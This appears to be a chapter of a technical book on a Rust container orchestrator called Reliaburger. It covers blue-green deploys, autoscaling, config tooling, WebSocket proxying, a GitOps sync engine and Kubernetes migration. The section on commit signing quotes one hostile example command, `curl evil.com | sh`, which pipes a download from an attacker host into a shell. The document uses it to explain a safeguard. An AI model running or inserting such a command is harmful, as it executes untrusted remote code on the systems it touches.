# The Full Package

Chapter 7 gave us rolling deploys. One instance at a time, health-checked, auto-rollback on failure. Good enough for most production deploys, and considerably better than "stop everything, start everything, hope for the best."

But "good enough for most" leaves gaps. What about the deploy where you *can't* afford even a single bad request during the transition? What about the team that scales from 3 replicas to 30 during peak hours and back to 3 overnight? What about the org that wants git to be the single source of truth, not a human running `relish apply`?

This chapter fills those gaps. Six features, each addressing a real operational need. Together they turn Reliaburger from a container orchestrator into a platform.

## Blue-green deploys

Rolling deploys replace instances one at a time. During the transition, both the old and new versions serve traffic simultaneously. For most apps, that's fine. For apps that have incompatible database schemas between versions, or APIs that break when clients see mixed responses, it's a problem.

Blue-green eliminates the mixed-version window. The approach: start an entirely new fleet ("green"), verify it's healthy, then switch all traffic at once. The old fleet ("blue") keeps running during the switch, so rollback is instant.

### How it differs from rolling

Rolling deploys are sequential. Each step is: start new, health check, swap routing, drain old, stop old. One at a time. Safe, but slow, and both versions serve traffic during the transition.

Blue-green deploys are batched. All new instances start in parallel. All get health-checked. If every green instance passes, routing swaps atomically. If any green instance fails, the entire green fleet gets torn down and blue keeps serving as if nothing happened.

```rust
pub fn execute_blue_green<D: DeployDriver>(
    state: &mut DeployState,
    driver: &D,
) -> Result<DeployResult, DeployError> {
    state.transition(DeployEvent::GreenStarting)?;

    // Start ALL green instances
    for step in &mut state.steps {
        let (id, _) = driver.start_instance(...)?;
        step.new_instance = Some(id);
    }

    // Health check ALL green instances
    state.transition(DeployEvent::GreenAllStarted)?;
    for step in &state.steps {
        driver.await_healthy(step.new_instance.as_deref().unwrap(), timeout)?;
    }

    // Atomic routing swap
    state.transition(DeployEvent::GreenAllHealthy)?;
    for step in &state.steps {
        driver.add_to_routing(app, step.new_instance...)?;
    }
    for step in &state.steps {
        driver.remove_from_routing(app, step.old_instance...);
    }

    // Drain and stop all blue instances
    // ...
}
```

The state machine got three new phases: `StartingGreen`, `HealthCheckingGreen`, `RoutingSwitching`. Each phase has a failure path. If a green instance fails health, the state machine transitions to `Reverting` (with auto-rollback) or `Halted` (without). The abort logic stops all green instances that were started and returns.

The key insight: the abort function doesn't need to "restore" anything. Blue was never touched. The routing table still points to blue. Aborting green is pure cleanup.

### Choosing between strategies

Use rolling when:
- Mixed versions are acceptable during transition
- You want to minimise extra resource usage (only 1 extra instance at a time)
- The deploy is routine (most deploys)

Use blue-green when:
- You need zero mixed-version traffic
- You can afford 2x replicas during the transition window
- Database migrations make rolling back individual instances meaningless

Configure it in the app's `[deploy]` section:

```toml
[app.web.deploy]
strategy = "blue-green"
health_timeout = "60s"
drain_timeout = "30s"
```

## Autoscaling

Three replicas at 2am is wasteful. Three replicas during a product launch is suicidal. You need the system to adjust replica counts based on actual load.

### The control loop

The autoscaler runs on the Raft leader, evaluating every 30 seconds. For each app with an `[autoscale]` section, it:

1. Queries Mayo for the average metric (CPU or memory) over a 5-minute window
2. Computes the desired replica count
3. Applies it if it differs from the current count

The formula: `desired = ceil(current * (metric / target))`. If you have 3 replicas at 90% CPU and your target is 70%, the desired count is `ceil(3 * 0.90 / 0.70) = ceil(3.86) = 4`. One more replica should bring the average down to roughly 67%.

```rust
fn compute_desired(current: u32, metric: f64, config: &AutoscaleConfig) -> u32 {
    let ratio = metric / config.target;
    let raw = (current as f64 * ratio).ceil() as u32;

    // Hysteresis: only scale down when well below target
    let desired = if raw < current {
        if metric < config.target * config.scale_down_threshold {
            raw
        } else {
            current
        }
    } else {
        raw
    };

    desired.clamp(config.min, config.max)
}
```

### Hysteresis and cooldown

Without hysteresis, the autoscaler oscillates. CPU drops to 60% (below the 70% target), it scales down, load per instance jumps back to 90%, it scales up, and you're stuck in a loop.

The fix: a scale-down threshold. The default is 0.8, meaning the metric must drop below `target * 0.8 = 56%` before scaling down. At 60%? No change. At 50%? Scale down. The gap between the scale-up trigger (> 70%) and the scale-down trigger (< 56%) prevents oscillation.

Cooldown adds a time buffer: 3 minutes between consecutive scale events for the same app. Even if the metric spikes again immediately after scaling up, the autoscaler waits. This gives the new replicas time to absorb load before the system decides they're not enough.

### Playing nice with GitOps

Can you see the problem? The git repo says `replicas = 3`. The autoscaler says `replicas = 7`. Who wins?

Both. The trick is to treat them as different concerns. The git value is the *baseline*. The autoscaler's adjustment is a *runtime override*. When Lettuce syncs, it compares the git value against the *previous git value*, not the runtime count. If the git value hasn't changed, the autoscaler's override is left alone. If the git value *has* changed (from 3 to 5, say), the autoscaler's baseline resets to 5.

```rust
pub fn update_baseline(&mut self, app_id: &AppId, new_baseline: u32) {
    if let Some(state) = self.states.get_mut(app_id) {
        state.baseline_replicas = new_baseline;
        state.current_replicas = new_baseline;
        state.last_scale_event = None;
    }
}
```

The `AutoscaleTracker` stores both the baseline (from git/config) and the current count (from the autoscaler). The `get_override` method returns `Some(n)` only if the current count differs from the baseline. Lettuce checks this to avoid resetting runtime adjustments.

### Configuration

```toml
[app.web.autoscale]
metric = "cpu"
target = "70%"
min = 2
max = 20
evaluation_window = "5m"    # optional, default 5m
cooldown = "3m"             # optional, default 3m
scale_down_threshold = 0.8  # optional, default 0.8
```

All three optional fields have sensible defaults. Most users will only set metric, target, min, and max.

## Config tooling

Before GitOps, before Kubernetes migration, before any of the fancy stuff, you need basic config manipulation tools. Three commands, all local (no cluster contact needed).

### `relish compile`

Merges a directory of TOML files into a single resolved config. Walks subdirectories recursively. If a subdirectory contains a `_defaults.toml`, those fields are merged into every app in the directory that doesn't set them explicitly.

```
configs/
  _defaults.toml          # image = "myorg/base:v1"
  web.toml                # [app.web] replicas = 3
  backend/
    api.toml              # [app.api] image = "api:v2"
```

Running `relish compile configs/` produces a single TOML with both apps. The web app inherits `image = "myorg/base:v1"` from defaults. The api app keeps its explicit image. The directory name `backend` becomes the namespace for the api app.

Invalid files produce warnings, not errors. One broken TOML file shouldn't block the other nine from compiling. The warnings include the filename and parse error.

### `relish fmt`

Reformats a TOML config with canonical section ordering. The order is: namespace, permission, app, job, build. Within each section, keys are alphabetical (courtesy of `BTreeMap`'s ordering when we round-trip through `toml`).

`relish fmt app.toml` rewrites the file in place. `relish fmt app.toml --check` exits non-zero if the file needs formatting, without modifying it. Use `--check` in CI to enforce consistent formatting.

The formatter is idempotent. Running it twice produces the same output as running it once.

### `relish diff`

Shows a structural, field-by-field diff between two configs. Not a text diff -- a semantic one. It knows that changing `image` from `v1` to `v2` is a modification, adding a new `[app.api]` section is an addition, and removing `[job.migrate]` is a deletion.

```
$ relish diff old.toml new.toml
~ app.web
    image: myapp:v1 -> myapp:v2
+ app.api
- job.cleanup
```

The output serialises to JSON for programmatic consumption. Lettuce's diff engine reuses the same structural comparison logic.

## WebSocket proxying

The Wrapper ingress proxy from Chapter 3 handles HTTP. But what happens when a client sends a WebSocket upgrade request?

The normal proxy path buffers the entire request body via `axum::body::to_bytes`. That's fine for regular HTTP. For WebSocket, it's fatal. WebSocket upgrade is an HTTP/1.1 mechanism: the client sends an upgrade request, the backend responds with `101 Switching Protocols`, and then both sides switch to raw TCP framing. You can't buffer that.

### Detection before buffering

The fix: check for WebSocket upgrade *before* touching the body.

```rust
async fn do_proxy(state: &ProxyState, req: Request<Body>) -> Response {
    let is_ws = is_websocket_upgrade(&req);

    // ... route lookup ...

    if is_ws && !route.websocket {
        return StatusCode::BAD_REQUEST.into_response();
    }

    if is_ws {
        return handle_websocket_upgrade(req, backend).await;
    }

    // Normal HTTP path (body buffering happens here)
    let body_bytes = axum::body::to_bytes(body, 10 * 1024 * 1024).await?;
    // ...
}
```

Two branches, decided before any I/O happens. WebSocket requests skip the body buffer entirely. Routes that don't have `websocket = true` reject upgrade attempts with 400. This prevents accidental WebSocket connections to backends that don't expect them.

### The upgrade detection

A valid WebSocket upgrade has two headers: `Connection: Upgrade` (or a Connection header containing "upgrade" as a token) and `Upgrade: websocket`. Both checks are case-insensitive. The Connection header can contain multiple values (`keep-alive, Upgrade`), so we check for the substring rather than exact match.

```rust
pub fn is_websocket_upgrade(req: &Request<Body>) -> bool {
    let has_upgrade_connection = req.headers()
        .get(header::CONNECTION)
        .and_then(|v| v.to_str().ok())
        .is_some_and(|v| v.to_lowercase().contains("upgrade"));

    let has_websocket_upgrade = req.headers()
        .get(header::UPGRADE)
        .and_then(|v| v.to_str().ok())
        .is_some_and(|v| v.eq_ignore_ascii_case("websocket"));

    has_upgrade_connection && has_websocket_upgrade
}
```

### Connection draining

WebSocket connections are long-lived. When a backend is being drained (during a rolling or blue-green deploy), HTTP connections finish naturally within the drain timeout. WebSocket connections don't finish on their own -- they stay open indefinitely.

The solution: send a WebSocket Close frame (opcode 0x08, status code 1001 "Going Away") to the client, wait 5 seconds for the close handshake, then RST the TCP connection. The Close frame is just 4 bytes:

```rust
pub fn build_close_frame(status: u16) -> Vec<u8> {
    vec![
        0x88,                        // FIN + opcode Close
        0x02,                        // payload length = 2
        (status >> 8) as u8,         // status high byte
        (status & 0xFF) as u8,       // status low byte
    ]
}
```

No need for a full WebSocket library. Four bytes, hand-built. Well-behaved WebSocket clients see the 1001, close their end of the connection, and reconnect to a healthy backend. Misbehaving clients get RST'd after the timeout.

## Lettuce: the GitOps engine

Every other subsystem in Reliaburger reacts to `relish apply`. Lettuce makes `relish apply` happen automatically when you push to git.

The idea: a module inside Bun watches a git repository. When a commit changes a TOML file, Lettuce parses it, diffs it against the current cluster state, and applies only the changes. No ArgoCD, no Flux, no CRDs, no extra binaries. Git is the source of truth.

### Architecture

Lettuce runs on a single council member elected as the **GitOps coordinator**. Not the Raft leader -- a separate election that distributes load. If the coordinator dies, another council member takes over within seconds, inheriting the last sync state from Raft.

The sync loop:

1. **Trigger.** Poll timer (default 30s) or webhook
2. **Git fetch.** If HEAD hasn't changed since last sync, short-circuit
3. **Signature verification.** If required (global or auto-enforced for script changes)
4. **TOML parse.** All `.toml` files under the configured path. Parse errors are per-file, not global
5. **Diff.** Field-by-field comparison against current Raft state. Autoscaler-aware
6. **Selective apply.** Only changed resources written to Raft

### Coordinator election

```rust
pub fn select_coordinator(
    council_members: &[String],
    leader_id: &str,
    reason: CoordinatorElectionReason,
) -> Option<CoordinatorElection> {
    let non_leaders: Vec<_> = council_members.iter()
        .filter(|id| id.as_str() != leader_id)
        .collect();

    let selected = if non_leaders.is_empty() {
        leader_id.to_string()  // single-node: leader is coordinator
    } else {
        let mut sorted = non_leaders;
        sorted.sort();
        sorted[0].clone()  // deterministic: first non-leader
    };

    Some(CoordinatorElection { node_id: selected, reason, ... })
}
```

Why prefer non-leaders? The Raft leader already handles write requests, log replication, and heartbeats. Adding the sync loop on top means the leader does more I/O during every sync cycle (git fetch, file read, Raft write). Putting it on another council member spreads the work across two nodes instead of concentrating it on one.

Why deterministic? If two nodes simultaneously decide the coordinator needs replacing, they must agree on who the replacement is. Sorting alphabetically and picking the first non-leader means every node arrives at the same answer independently.

### Webhook validation

When a git provider sends a push webhook, Lettuce validates it with three checks:

1. **HMAC-SHA256 signature.** GitHub sends `X-Hub-Signature-256: sha256=<hex>`. We compute the HMAC with the configured secret and compare. A mismatch means the payload was tampered with or the secret is wrong.

2. **Replay detection.** GitHub includes a unique delivery ID in `X-GitHub-Delivery`. Lettuce keeps the last 1000 delivery IDs in a bounded deque. If the same ID shows up twice, it's a replay (network retry, misconfigured webhook, or attack).

3. **Rate limiting.** Token bucket, configurable per minute (default 10). A burst of webhook deliveries from a force-push-heavy workflow doesn't overwhelm the sync loop. Excess webhooks are rejected with an error; the poll timer catches up on the next cycle.

### Script-aware signing

Here's a subtle security requirement. An unsigned commit that changes `image = "redis:7"` to `image = "redis:8"` is probably fine. An unsigned commit that adds `script = "curl evil.com | sh"` is definitely not.

Lettuce auto-enforces commit signing for any commit that adds or modifies a `script` field, regardless of the global `require_signed_commits` setting. The check happens by diffing the commit against its parent and searching for added lines containing "script".

### Back-off on failure

If a sync fails (network error, git auth failure, parse error), Lettuce doesn't retry at the normal interval. It backs off exponentially: 30s, 60s, 120s, 240s, capped at 8x the base interval. Consecutive failure count resets to zero on the first successful sync.

```rust
pub fn backoff_delay(base: Duration, failures: u32) -> Duration {
    let multiplier = 2u32.saturating_pow(failures).min(8);
    base * multiplier
}
```

## Kubernetes migration

Most teams don't start from scratch. They have existing Kubernetes manifests -- dozens of them, spread across namespaces, wired together with Services, Ingresses, HPAs, ConfigMaps. Asking those teams to rewrite everything in TOML by hand is a non-starter.

`relish import` and `relish export` solve this. Import reads K8s YAML and produces Reliaburger TOML. Export goes the other way. Together they make migration a mechanical process, not a rewrite.

### The correlation problem

In Kubernetes, a single application is split across multiple resource types. A web app might be: a Deployment (the containers), a Service (the network endpoint), an Ingress (the external routing), an HPA (the autoscaler), a ConfigMap (the configuration), and a Secret (the credentials). Six YAML files, each referencing the others by name.

In Reliaburger, that same application is one `[app.web]` section with sub-sections for ingress, autoscale, env, and health. The importer needs to figure out which K8s resources belong together and merge them.

The correlation rules use the same matching logic Kubernetes itself uses:

1. Service → Deployment by label selector
2. Ingress → Service by backend service name
3. HPA → workload by `scaleTargetRef.name`

```rust
fn find_ingress_for_service(
    ingresses: &BTreeMap<String, Ingress>,
    service_name: &str,
) -> Option<String> {
    for (ing_name, ing) in ingresses {
        if let Some(spec) = &ing.spec {
            if let Some(rules) = &spec.rules {
                for rule in rules {
                    if let Some(http) = &rule.http {
                        for path in &http.paths {
                            if let Some(backend) = &path.backend.service {
                                if backend.name == service_name {
                                    return Some(ing_name.clone());
                                }
                            }
                        }
                    }
                }
            }
        }
    }
    None
}
```

Five levels of `if let Some`. That's what happens when you navigate the K8s API's deeply nested Option types. Each level is a field that might not be set. The k8s-openapi crate mirrors the Go API faithfully, including the optionality of everything.

### Using k8s-openapi

We debated hand-rolling lightweight K8s structs vs pulling in the official types. The official types won for one reason: correctness. The K8s API has hundreds of fields with subtle serialisation rules (camelCase JSON keys, integer-or-string unions, multiple API versions). Getting all of that right by hand is a maintenance burden. Getting it right once via `k8s-openapi` is free.

The dependency is optional. A `kubernetes` Cargo feature (default-on) gates the import/export modules. Users who don't need K8s migration compile with `--no-default-features` and skip the dependency entirely.

```toml
[features]
default = ["kubernetes"]
kubernetes = ["dep:k8s-openapi"]

[dependencies]
k8s-openapi = { version = "0.22", default-features = false, features = ["latest"], optional = true }
```

We disable `default-features` on k8s-openapi because we only need the type definitions, not the API client operations. That shaves off a chunk of compile time.

### The field mapping

A Kubernetes Deployment becomes an `AppSpec`. The mapping isn't one-to-one, but it's close enough that the output is usable without manual editing for most cases:

- `spec.replicas` → `replicas`
- `spec.template.spec.containers[0].image` → `image`
- `spec.template.spec.containers[0].ports[0].containerPort` → `port`
- `readinessProbe.httpGet.path` → `health.path`
- `strategy.rollingUpdate.maxSurge` → `deploy.max_surge`
- `terminationGracePeriodSeconds` → `deploy.drain_timeout`
- `nodeSelector` → `placement.required`
- `initContainers` → `init`

DaemonSets become `replicas = "*"`. StatefulSets produce a warning because Reliaburger doesn't have ordered startup or stable network IDs. Jobs and CronJobs map directly.

### The migration report

Every import produces a report on stderr: what was converted, what was approximated, and what was dropped.

```
Converted:
  + Deployment/web → [app.web]

Approximated (review recommended):
  ~ StatefulSet/redis — ordering guarantees and stable network IDs lost

Dropped (no Reliaburger equivalent):
  - MyCustomResource/foo — no Reliaburger equivalent
  - ServiceAccount/worker-sa — no Reliaburger equivalent
```

CRDs, ServiceAccounts, PodDisruptionBudgets, RBAC — these either have no equivalent or are handled automatically by Reliaburger (SPIFFE replaces ServiceAccounts, deploy config replaces PDBs). The report tells you exactly what to review.

### Export: the reverse direction

`relish export` reads a TOML config and produces multi-document K8s YAML. Each app becomes a Deployment + Service (or DaemonSet). Ingress, HPA, ConfigMap, and Secret resources are added when the relevant config sections exist.

Features with no K8s equivalent show up in the export report: `auto_rollback`, Smoker fault rules, process workloads, build jobs, `run_before` dependency ordering. The report suggests K8s alternatives where they exist (Argo Workflows for dependency ordering, NetworkPolicy for firewall rules).

## Lessons learned

**The mock driver refactor was worth it.** When we added blue-green deploys, the existing `MockDriver` broke. It tracked steps by counting `stop_instance` calls, which worked for rolling (one stop per step). In blue-green, all starts happen before any stops. The fix: separate counters for start and health check calls. A small change, but it highlighted why the mock should model *operation counts*, not *lifecycle phases*.

**Hysteresis is not optional.** The first autoscaler version scaled down as soon as the metric dropped below target. It oscillated wildly. CPU drops, scale down, CPU spikes, scale up, CPU drops, scale down. The hysteresis threshold (scale down only below target * 0.8) eliminated the oscillation. The cooldown (3 minutes between scale events) added stability. Both are required. Neither is clever -- they're standard control theory, applied.

**`toml_edit` was overkill for formatting.** We initially used `toml_edit` to preserve comments during formatting. It works, but the comment-preserving reserialisation introduced subtle ordering bugs that were painful to debug. We switched to a simpler approach: parse with `toml`, reserialise with canonical section ordering, accept that comments are lost. For machine-generated configs (which is what `relish compile` produces, and what Lettuce processes), comment loss is irrelevant. For hand-edited configs, `relish lint` validates without reformatting.

**WebSocket is 95% detection, 5% proxying.** We spent most of the time on header detection edge cases (case-insensitive matching, multi-value Connection headers, routes that don't opt in). The actual proxying -- connect to backend, forward upgrade, bidirectional copy -- is straightforward. The Close frame for draining is 4 bytes of hand-built binary. No WebSocket library needed.

**Coordinator election should be boring.** Our first design for Lettuce's coordinator election had scoring heuristics: CPU load, memory availability, network latency to the git remote. We replaced it with "first non-leader alphabetically." It's deterministic, requires no measurement, and produces the same result on every node without communication. The scoring approach might produce slightly better placement, but the added complexity wasn't worth it for a role that does one git fetch every 30 seconds.

**`skip_serializing_if` is not optional for config output.** The first version of `relish compile` and `relish import` produced TOML with dozens of empty sections: `[app.web.env]` with nothing in it, `command = []`, `config_file = []`, `[job]`, `[namespace]`, `[permission]`, `[build]`. Every `#[serde(default)]` field got serialised to its default value. The fix was adding `#[serde(skip_serializing_if = "Vec::is_empty")]` and friends to every collection and Option field on `AppSpec`, `JobSpec`, and `Config`. One attribute per field, mechanical work, but the output went from 30 lines of noise per app to just the fields that matter.

**Defaults must cascade.** The first `relish compile` applied `_defaults.toml` only to files in the same directory. A config structure with `configs/_defaults.toml` and `configs/backend/api.toml` wouldn't inherit the defaults into the subdirectory. The fix was passing the parent's defaults into the recursive call, with the child's own `_defaults.toml` taking priority if present. The bug was invisible in unit tests (which tested flat directories) and only showed up in the demo script, which was the first time anyone tried a nested directory structure. Write your demo scripts early.

**Five levels of `if let Some` is the price of K8s correctness.** The k8s-openapi crate is faithful to the Go API, where every field is a pointer and might be nil. In Rust, that becomes deeply nested `Option` chains. You can flatten them with helper functions, but the navigation code still reads like an archaeological dig through layers of optionality. The alternative -- hand-rolled structs with `#[serde(default)]` on everything -- trades correctness for readability. We picked correctness and accepted the nesting.

## Test count

Phase 9 adds 117 tests, bringing the total to 1380. The new tests cover: config compilation and defaults merging (7), TOML formatting idempotency and section ordering (4), structural diffing (8), CLI parse for new commands (7), blue-green orchestrator with mock driver (6), deploy state machine blue-green transitions (7), autoscaler scaling logic with hysteresis and cooldown (12), autoscale config parsing and tracker state (6), WebSocket header detection and close frame construction (8), Lettuce types serde round-trips (4), git clone/fetch/list operations (4), webhook HMAC validation, replay detection, and rate limiting (7), GitOps diff with autoscaler awareness (7), sync loop TOML parsing (3), coordinator election (5), commit signature verification (1), K8s import (10), and K8s export (6).
